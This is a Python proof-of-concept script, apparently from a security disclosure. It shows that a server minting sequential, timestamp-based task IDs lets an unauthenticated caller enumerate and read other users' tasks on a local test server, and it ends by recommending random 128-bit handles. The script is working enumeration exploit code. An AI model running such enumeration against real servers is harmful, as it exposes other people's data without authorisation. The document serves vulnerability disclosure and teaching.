#!/usr/bin/env python3
"""
PoC 2 - Enumerable Handles

The spec says servers MUST mint task IDs with "sufficient entropy that a third
party cannot enumerate or guess them" - then leaves generation to you. A very
normal-looking dev shortcut (an incrementing id, a timestamp) turns every task
into a public URL. No leak required; you just count.

Setup (note the flag):
    python3 server.py --port 9001 --store /tmp/mcp_tasks.db --fresh --weak-handles
Run:
    python3 poc2_enumerable_handles.py
"""
from common import call, line

PORT = 9001

print("A few users kick off tasks on a server that mints guessable handles.")
mint = []
for tok, note in [("tok-alice", "invoice #A"), ("tok-bob", "invoice #B"), ("tok-alice", "invoice #C")]:
    r = call(PORT, "tools/call", {"name": "make_invoice", "arguments": {"note": note}}, token=tok)
    mint.append(r["task"]["taskId"])
print("  handles minted:")
for h in mint: print("   ", h)
line()

# attacker sees ONE handle (say their own) and guesses the neighbourhood
seed = mint[-1]
base_ts, base_n = seed.rsplit("_", 2)[1], int(seed.rsplit("_", 1)[1])
print(f"Attacker has one handle ({seed}) and just walks the counter:")
stolen = 0
for n in range(1, base_n + 3):
    guess = f"task_{base_ts}_{n:04d}"
    res = call(PORT, "tasks/get", {"taskId": guess})   # no token
    t = res.get("task")
    if t:
        stolen += 1
        print(f"   {guess}  ->  owner={t['owner']:5}  tenant={t['tenant']}")
line()
print(f"Enumerated {stolen} other people's tasks by counting. 'Unguessable' was")
print("doing security work the protocol never enforced.")
print("\nFIX: secrets.token_urlsafe(32) (>=128 bits), opaque, non-sequential.")
